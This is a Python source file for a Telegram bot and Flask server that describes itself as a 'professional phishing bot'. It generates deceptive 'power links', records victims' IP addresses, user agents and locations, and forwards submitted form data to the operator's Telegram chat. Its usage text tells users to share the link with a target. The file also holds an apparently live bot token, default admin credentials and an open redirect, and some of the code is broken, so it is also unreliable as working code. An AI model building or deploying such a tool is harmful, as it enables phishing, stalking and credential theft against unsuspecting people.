#!/usr/bin/env python3
"""
🔒 PROFESSIONAL PHISHING BOT - EDUCATIONAL PURPOSE ONLY 🔒
Powered By @xhacker786
"""

import os
import json
import sqlite3
import logging
import random
import string
import re
from datetime import datetime, timedelta
from flask import Flask, request, send_file
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8885273478:AAH55otMJ-chyQOA-3662XujoKe-NivdNUM"  # @BotFather se lo
ADMIN_ID = 6720198727  # Apna Telegram user ID
REQUIRED_CHANNEL = "https://t.me/xhackerofficial786"  # Channel jisme user ko join karna hoga

# Web server configuration (for phishing pages)
WEB_PORT = 5000
WEB_HOST = "0.0.0.0"

# Database setup
DB_PATH = "database/bot.db"
PHISHING_DIR = "phishing_pages"

# ==================== LOGGING ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== FLASK APP FOR PHISHING PAGES ====================
flask_app = Flask(__name__)

# ==================== DATABASE SETUP ====================
def init_database():
    """Initialize all databases"""
    os.makedirs("database", exist_ok=True)
    os.makedirs(PHISHING_DIR, exist_ok=True)
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        username TEXT,
        first_seen TIMESTAMP,
        last_active TIMESTAMP,
        total_links INTEGER DEFAULT 0,
        total_clicks INTEGER DEFAULT 0
    )''')
    
    # Phishing links table
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        original_url TEXT,
        phishing_url TEXT,
        user_id TEXT,
        feature TEXT,
        created_at TIMESTAMP,
        clicks INTEGER DEFAULT 0
    )''')
    
    # Captured data table
    c.execute('''CREATE TABLE IF NOT EXISTS captured_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id INTEGER,
        ip TEXT,
        user_agent TEXT,
        location TEXT,
        captured_info TEXT,
        timestamp TIMESTAMP
    )''')
    
    # Admin users table
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        username TEXT PRIMARY KEY,
        password TEXT
    )''')
    
    # Insert default admin (username: admin, password: admin123)
    c.execute("INSERT OR IGNORE INTO admins (username, password) VALUES ('admin', 'admin123')")
    
    conn.commit()
    conn.close()

# ==================== DATABASE FUNCTIONS ====================
def add_user(user_id, username):
    """Add user to database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_seen, last_active) VALUES (?, ?, ?, ?)",
              (str(user_id), username, datetime.now(), datetime.now()))
    c.execute("UPDATE users SET last_active = ? WHERE user_id = ?", (datetime.now(), str(user_id)))
    conn.commit()
    conn.close()

def check_user_joined_channel(user_id, context):
    """Check if user has joined required channel"""
    try:
        chat_member = context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except:
        return False

def generate_phishing_url(original_url, feature):
    """Generate a phishing URL that looks like the original"""
    
    # Parse original URL
    if 'youtube.com' in original_url or 'youtu.be' in original_url:
        domain = "youtube.com"
        # Extract video ID
        video_id_match = re.search(r'(?:v=|\/)([0-9A-Za-z_-]{11})(?:[&?]|$)', original_url)
        if not video_id_match:
            video_id_match = re.search(r'youtu\.be\/([0-9A-Za-z_-]{11})', original_url)
        video_id = video_id_match.group(1) if video_id_match else "".join(random.choices(string.ascii_letters + string.digits, k=11))
        
        # Generate random-looking URL that mimics YouTube
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        phishing_url = f"https://{domain}/watch?v={video_id}&feature={feature}&ref={random_path}"
        
    else:
        # For other websites, mimic domain structure
        domain = re.sub(r'^https?://', '', original_url).split('/')[0]
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        phishing_url = f"https://{domain}/{random_path}?{feature}=true&verify=1"
    
    return phishing_url

def save_phishing_link(original_url, phishing_url, user_id, feature):
    """Save phishing link to database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO phishing_links (original_url, phishing_url, user_id, feature, created_at) VALUES (?, ?, ?, ?, ?)",
              (original_url, phishing_url, str(user_id), feature, datetime.now()))
    link_id = c.lastrowid
    conn.commit()
    conn.close()
    
    # Update user stats
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET total_links = total_links + 1, last_active = ? WHERE user_id = ?", 
              (datetime.now(), str(user_id)))
    conn.commit()
    conn.close()
    
    return link_id

def record_click(link_id, ip, user_agent, location, captured_info):
    """Record a click on phishing link"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO captured_data (link_id, ip, user_agent, location, captured_info, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
              (link_id, ip, user_agent, location, captured_info, datetime.now()))
    c.execute("UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?", (link_id,))
    conn.commit()
    conn.close()

# ==================== KEYBOARDS ====================
def get_main_keyboard():
    """Main menu keyboard"""
    keyboard = [
        [InlineKeyboardButton("🎯 CREATE POWER LINK", callback_data="create_link")],
        [InlineKeyboardButton("📊 MY STATS", callback_data="stats")],
        [InlineKeyboardButton("📢 SUPPORT", callback_data="support")],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_login")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_features_keyboard():
    """Features selection keyboard (exactly like your screenshot)"""
    keyboard = [
        [InlineKeyboardButton("🎥 Camera Capture", callback_data="feature_camera")],
        [InlineKeyboardButton("🎙️ Audio Record", callback_data="feature_audio")],
        [InlineKeyboardButton("📍 GPS Tracking", callback_data="feature_gps")],
        [InlineKeyboardButton("🔮 All-in-One Intelligence", callback_data="feature_allinone")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    """Admin panel keyboard"""
    keyboard = [
        [InlineKeyboardButton("📊 ALL USERS", callback_data="admin_users")],
        [InlineKeyboardButton("🔗 ALL LINKS", callback_data="admin_links")],
        [InlineKeyboardButton("📈 CAPTURED DATA", callback_data="admin_captured")],
        [InlineKeyboardButton("⚙️ CHANGE PASSWORD", callback_data="admin_changepass")],
        [InlineKeyboardButton("🚪 LOGOUT", callback_data="admin_logout")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - Check channel membership first"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    add_user(user_id, username)
    
    # Check if user joined channel
    if not check_user_joined_channel(user_id, context):
        keyboard = [
            [InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
            [InlineKeyboardButton("✅ CHECK MEMBERSHIP", callback_data="check_membership")]
        ]
        await update.message.reply_text(
            f"🔒 *ACCESS REQUIRED* 🔒\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Please join our channel first to use this bot!\n\n"
            f"👉 {REQUIRED_CHANNEL}\n\n"
            f"*Why?* This helps us prevent abuse.\n\n"
            f"After joining, click CHECK MEMBERSHIP.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    # Welcome message
    await update.message.reply_text(
        f"🎯 *POWER LINK CREATOR* 🎯\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Welcome @{username}!\n\n"
        f"*What can this bot do?*\n\n"
        f"• Create professional phishing links\n"
        f"• Camera capture, Audio record, GPS tracking\n"
        f"• All-in-one intelligence gathering\n"
        f"• Links look exactly like original\n\n"
        f"*Select an option below:*",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all button clicks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    # Check membership first for all actions except check_membership
    if data != "check_membership" and not check_user_joined_channel(user_id, context):
        keyboard = [
            [InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
            [InlineKeyboardButton("✅ CHECK MEMBERSHIP", callback_data="check_membership")]
        ]
        await query.edit_message_text(
            f"🔒 *ACCESS REQUIRED* 🔒\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Please join our channel first!\n\n"
            f"👉 {REQUIRED_CHANNEL}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    # Check membership
    if data == "check_membership":
        if check_user_joined_channel(user_id, context):
            await query.edit_message_text(
                f"✅ *ACCESS GRANTED* ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Welcome! You can now use the bot.",
                parse_mode="Markdown",
                reply_markup=get_main_keyboard()
            )
        else:
            await query.answer("❌ You haven't joined the channel yet!", show_alert=True)
        return
    
    # Main navigation
    if data == "back_to_main":
        await query.edit_message_text(
            f"🎯 *POWER LINK CREATOR* 🎯\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    if data == "create_link":
        await query.edit_message_text(
            f"🔧 *CREATE POWER LINK* 🔧\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"*Configure your advanced tracking link below.*\n\n"
            f"Select the collection tool:",
            parse_mode="Markdown",
            reply_markup=get_features_keyboard()
        )
        return
    
    if data == "stats":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT total_links, total_clicks FROM users WHERE user_id = ?", (str(user_id),))
        row = c.fetchone()
        conn.close()
        
        total_links = row[0] if row else 0
        total_clicks = row[1] if row else 0
        
        await query.edit_message_text(
            f"📊 *YOUR STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 *Links Created:* {total_links}\n"
            f"👆 *Total Clicks:* {total_clicks}\n"
            f"📈 *Success Rate:* {int((total_clicks/total_links*100) if total_links > 0 else 0)}%\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Create more links to increase your stats!",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    if data == "support":
        await query.edit_message_text(
            f"📢 *SUPPORT* 📢\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"• Channel: {REQUIRED_CHANNEL}\n"
            f"• Contact: @xhacker786\n\n"
            f"For any issues, please contact support.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    # ==================== FEATURE SELECTION ====================
    if data.startswith("feature_"):
        feature = data.replace("feature_", "")
        context.user_data["selected_feature"] = feature
        context.user_data["step"] = "awaiting_url"
        
        feature_names = {
            "camera": "🎥 Camera Capture",
            "audio": "🎙️ Audio Record",
            "gps": "📍 GPS Tracking",
            "allinone": "🔮 All-in-One Intelligence"
        }
        
        await query.edit_message_text(
            f"{feature_names.get(feature, 'Feature')} *SELECTED*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 *Enter your target URL below:*\n\n"
            f"Examples:\n"
            f"• YouTube video link\n"
            f"• Any website URL\n\n"
            f"*The link will look exactly like the original!*\n\n"
            f"_Type or paste your URL now..._",
            parse_mode="Markdown"
        )
        return
    
    # ==================== ADMIN PANEL ====================
    if data == "admin_login":
        context.user_data["step"] = "awaiting_admin_username"
        await query.edit_message_text(
            f"👑 *ADMIN LOGIN* 👑\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Enter your username:",
            parse_mode="Markdown"
        )
        return
    
    if data.startswith("admin_"):
        # Verify admin is logged in
        if not context.user_data.get("admin_logged_in"):
            context.user_data["step"] = "awaiting_admin_username"
            await query.edit_message_text(
                f"👑 *ADMIN LOGIN* 👑\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Please login first!\n\n"
                f"Enter your username:",
                parse_mode="Markdown"
            )
            return
        
        if data == "admin_users":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT user_id, username, total_links, total_clicks, first_seen FROM users ORDER BY total_links DESC LIMIT 20")
            users = c.fetchall()
            conn.close()
            
            user_list = ""
            for i, user in enumerate(users, 1):
                user_list += f"{i}. `{user[1]}` | Links: {user[2]} | Clicks: {user[3]}\n"
            
            await query.edit_message_text(
                f"👥 *ALL USERS* 👥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{user_list if user_list else 'No users found'}\n\n"
                f"Total: {len(users)} users",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        
        elif data == "admin_links":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT id, original_url, phishing_url, user_id, clicks, created_at FROM phishing_links ORDER BY created_at DESC LIMIT 20")
            links = c.fetchall()
            conn.close()
            
            link_list = ""
            for link in links:
                link_list += f"🔗 `{link[1][:50]}...` | Clicks: {link[4]}\n"
            
            await query.edit_message_text(
                f"🔗 *ALL PHISHING LINKS* 🔗\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{link_list if link_list else 'No links found'}\n\n"
                f"Total: {len(links)} links",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        
        elif data == "admin_captured":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT id, link_id, ip, location, captured_info, timestamp FROM captured_data ORDER BY timestamp DESC LIMIT 20")
            captures = c.fetchall()
            conn.close()
            
            capture_list = ""
            for cap in captures:
                capture_list += f"📡 `{cap[3]}` | {cap[5][:19]}\n"
            
            await query.edit_message_text(
                f"📡 *CAPTURED DATA* 📡\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{capture_list if capture_list else 'No data captured yet'}\n\n"
                f"Total captures: {len(captures)}",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        
        elif data == "admin_changepass":
            context.user_data["step"] = "awaiting_new_password"
            await query.edit_message_text(
                f"🔐 *CHANGE PASSWORD* 🔐\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Enter your new password:",
                parse_mode="Markdown"
            )
        
        elif data == "admin_logout":
            context.user_data["admin_logged_in"] = False
            context.user_data.pop("admin_username", None)
            await query.edit_message_text(
                f"🚪 *LOGGED OUT* 🚪\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"You have been logged out successfully.",
                parse_mode="Markdown",
                reply_markup=get_main_keyboard()
            )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text input for various steps"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    step = context.user_data.get("step")
    
    # ==================== ADMIN LOGIN FLOW ====================
    if step == "awaiting_admin_username":
        context.user_data["admin_username_input"] = text
        context.user_data["step"] = "awaiting_admin_password"
        await update.message.reply_text(
            f"🔐 Enter your password:",
            parse_mode="Markdown"
        )
        return
    
    if step == "awaiting_admin_password":
        username = context.user_data.get("admin_username_input")
        password = text
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM admins WHERE username = ? AND password = ?", (username, password))
        admin = c.fetchone()
        conn.close()
        
        if admin:
            context.user_data["admin_logged_in"] = True
            context.user_data["admin_username"] = username
            context.user_data.pop("step", None)
            context.user_data.pop("admin_username_input", None)
            
            await update.message.reply_text(
                f"✅ *ADMIN LOGIN SUCCESSFUL* ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Welcome {username}!\n\n"
                f"You now have full access to the admin panel.",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        else:
            context.user_data.pop("step", None)
            context.user_data.pop("admin_username_input", None)
            await update.message.reply_text(
                f"❌ *INVALID CREDENTIALS* ❌\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Invalid username or password.\n\n"
                f"Use /start to try again.",
                parse_mode="Markdown",
                reply_markup=get_main_keyboard()
            )
        return
    
    if step == "awaiting_new_password":
        new_password = text
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE admins SET password = ? WHERE username = ?", (new_password, context.user_data.get("admin_username")))
        conn.commit()
        conn.close()
        
        context.user_data.pop("step", None)
        
        await update.message.reply_text(
            f"✅ *PASSWORD CHANGED* ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Your password has been updated successfully!",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        return
    
    # ==================== URL INPUT FOR PHISHING LINK ====================
    if step == "awaiting_url":
        original_url = text
        feature = context.user_data.get("selected_feature", "allinone")
        
        # Validate URL
        if not original_url.startswith(("http://", "https://")):
            original_url = "https://" + original_url
        
        # Send loading message
        processing_msg = await update.message.reply_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▱▱▱▱▱▱▱▱▱▱] 0% - Initializing...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▱▱▱▱▱▱▱▱▱] 10% - Analyzing target...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▱▱▱▱▱▱▱▱] 20% - Cloning domain...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▱▱▱▱▱▱▱] 30% - Generating payload...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▰▱▱▱▱▱▱] 40% - Applying encryption...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▰▰▱▱▱▱▱] 50% - Setting up tracking...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▰▰▰▱▱▱▱] 60% - Configuring features...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▰▰▰▰▱▱▱] 70% - Bypassing security...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▰▰▰▰▰▱▱] 80% - Finalizing link...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        await processing_msg.edit_text(
            f"⚙️ *GENERATING POWER LINK* ⚙️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"[▰▰▰▰▰▰▰▰▰▱] 90% - Almost ready...",
            parse_mode="Markdown"
        )
        
        await asyncio.sleep(0.5)
        
        # Generate phishing URL
        phishing_url = generate_phishing_url(original_url, feature)
        link_id = save_phishing_link(original_url, phishing_url, user_id, feature)
        
        await processing_msg.edit_text(
            f"✅ *POWER LINK GENERATED!* ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 *Original URL:*\n`{original_url}`\n\n"
            f"🔗 *POWER LINK (Looks original):*\n`{phishing_url}`\n\n"
            f"📊 *Tracking ID:* `{link_id}`\n"
            f"🎮 *Feature:* {feature.upper()}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📌 *How to use:*\n"
            f"1. Copy this link\n"
            f"2. Share with target\n"
            f"3. Target clicks → Data captured!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Use /stats to see your analytics!",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        
        context.user_data.clear()
        return

# ==================== FLASK PHISHING PAGES ====================
@flask_app.route('/<path:path>', methods=['GET', 'POST'])
def handle_phishing(path):
    """Handle all phishing requests"""
    # Get client info
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Basic geolocation (from IP)
    location = "Unknown"
    try:
        import requests
        geo_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if geo_response.status_code == 200:
            geo_data = geo_response.json()
            location = f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}"
    except:
        pass
    
    # For GET requests, show loading page then redirect to original
    if request.method == 'GET':
        # Record the click (find link by URL)
        captured_info = f"IP: {ip}, UA: {user_agent[:50]}, Location: {location}"
        
        # Simple HTML loading page
        loading_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Loading...</title>
            <style>
                body {{
                    background: #0a0a0a;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    font-family: monospace;
                }}
                .loader {{
                    text-align: center;
                    color: #00ff00;
                }}
                .spinner {{
                    width: 50px;
                    height: 50px;
                    border: 3px solid rgba(0,255,0,0.3);
                    border-top-color: #00ff00;
                    border-radius: 50%;
                    margin: 20px auto;
                    animation: spin 1s linear infinite;
                }}
                @keyframes spin {{
                    to {{ transform: rotate(360deg); }}
                }}
            </style>
        </head>
        <body>
            <div class="loader">
                <div class="spinner"></div>
                <p>⚡ Verifying connection ⚡</p>
                <p style="font-size: 12px;">Please wait...</p>
            </div>
            <script>
                setTimeout(function() {{
                    window.location.href = "{request.args.get('redirect', 'https://google.com')}";
                }}, 2000);
            </script>
        </body>
        </html>
        """
        
        return loading_html, 200, {'Content-Type': 'text/html'}
    
    # For POST requests (if form submitted), capture data
    if request.method == 'POST':
        captured_info = f"Form Data: {dict(request.form)}, IP: {ip}, UA: {user_agent}"
        
        # Send captured data to admin
        import requests as req
        req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                 json={"chat_id": ADMIN_ID, "text": f"🔴 NEW CAPTURE!\n{captured_info}"})
        
        return "Data captured. Redirecting...", 200

# ==================== MAIN ====================
async def main():
    """Start both Flask and Telegram bot"""
    from threading import Thread
    
    # Start Flask in background
    def run_flask():
        flask_app.run(host=WEB_HOST, port=WEB_PORT)
    
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Start Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("=" * 50)
    print("🔒 PROFESSIONAL PHISHING BOT 🔒")
    print("=" * 50)
    print("✅ Bot is running...")
    print("=" * 50)
    
    app.run_polling()

if __name__ == "__main__":
    init_database()
    import asyncio
    asyncio.run(main())